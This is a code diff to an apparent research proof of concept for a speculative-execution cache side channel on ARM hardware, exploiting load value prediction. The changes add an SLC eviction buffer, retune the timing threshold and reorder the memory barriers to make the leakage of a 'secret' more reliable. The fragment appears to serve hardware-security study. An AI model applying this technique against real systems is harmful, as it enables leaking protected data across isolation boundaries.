@@ -8,8 +8,9 @@
 #define PAGE_SZ 16384
 #define CACHE_LINE_SZ 128
 #define NUM_CACHELINES PAGE_SZ / CACHE_LINE_SZ
-#define CACHE_HIT_THRESHOLD 100
+#define CACHE_HIT_THRESHOLD 250
 #define REPS 250
+#define EVICT_SIZE (48UL * 1024 * 1024)
 
 #define READ(addr) (*(volatile uint32_t *)(addr))
 #define FORCE_READ(addr, trash) (READ((uintptr_t)(addr) | (trash == 0xbaaaaad)))
@@ -146,8 +147,17 @@ int main(int argc, char *argv[])
         channel_ptr = (unsigned char *)channel_pages;
     }
 
+    // SLC eviction buffer.
+    void *evict_buf = mmap(NULL, EVICT_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (evict_buf == MAP_FAILED)
+    {
+        printf("Failed to allocate eviction buffer\n");
+        return EXIT_FAILURE;
+    }
+    memset(evict_buf, 0xAA, EVICT_SIZE);
+
     // Training. Note that the pointer to the secret function is never
-    // passed, and so it is never executed. The secret function also 
+    // passed, and so it is never executed. The secret function also
     // loads from address 0x0, so architectural execution results in segfault.
     critical_section(page, indices, channel_ptr, dummy_function, dummy_function, REPS);
 
@@ -167,9 +177,14 @@ int main(int argc, char *argv[])
         clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));
     }
 
-    // Serialize the flush operations.
-    asm volatile("isb");
+    // SLC eviction: push channel and page data from SLC to DRAM.
+    for (size_t off = 0; off < EVICT_SIZE; off += CACHE_LINE_SZ)
+    {
+        (void)(*(volatile char *)((char *)evict_buf + off));
+    }
+
     asm volatile("dsb ish");
+    asm volatile("isb");
 
     // Load the same PC again, activating the LVP. Here, aop[0] will
     // have secret, and aop[1] will have dummy.
@@ -205,6 +220,7 @@ int main(int argc, char *argv[])
         printf("Failed to deallocate cache channel pages\n");
         return EXIT_FAILURE;
     }
+    munmap(evict_buf, EVICT_SIZE);
 
     clock_gettime(CLOCK_MONOTONIC, &end);
     elapsed_time = (end.tv_sec - start.tv_sec) +
